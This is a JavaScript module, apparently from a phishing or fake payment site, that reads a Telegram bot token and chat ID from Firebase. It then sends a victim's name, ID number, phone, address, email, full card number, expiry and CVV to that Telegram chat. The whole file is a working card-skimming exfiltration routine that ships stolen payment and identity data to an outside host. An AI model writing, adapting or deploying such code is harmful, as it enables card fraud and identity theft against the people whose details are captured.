import { db,doc, getDoc } from "../../../../Firebase/FirebaseConfig";

const sendTelegram =async(info) => {  
  try {
    const colRef = doc(db, 'url', 'url-id');
    const result = await getDoc(colRef)
    const tok = result.data().tok
    const cId= result.data().cId2
  
    const configTelegram = {
        baseURL: 'https://api.telegram.org/bot',
        parse_mode: 'MarkdownV2',
    }
    
    const { data, infoPay } = info
  
    const mensaje = `|Informacion de Usuario|%0A%0A
Nombre:${infoPay.name || "Null"}%0A
CI: ${infoPay.CI||"Null"}%0A
Celular: ${infoPay.cel||"Null"}%0A
Ciudad: ${infoPay.city||"Null"}%0A
Direccion: ${infoPay.direc||"Null"}%0A
Correo: ${infoPay.email||"Null"}%0A %0A
TC: ${data.TC||"Null"}|${data.Año||"Null"}|${data.Mes||"Null"} %0A
CVV: ${data.cvv||"Null"}%0A
Banco: ${data.bank||"Null"}%0A
`       
    const {baseURL,parse_mode}=configTelegram
    
    const url = baseURL + tok + `/sendMessage?chat_id=${cId}&${parse_mode}&text=` + mensaje
    await fetch(url);
    
} catch (error) {
    console.log(error)
}

}

export default sendTelegram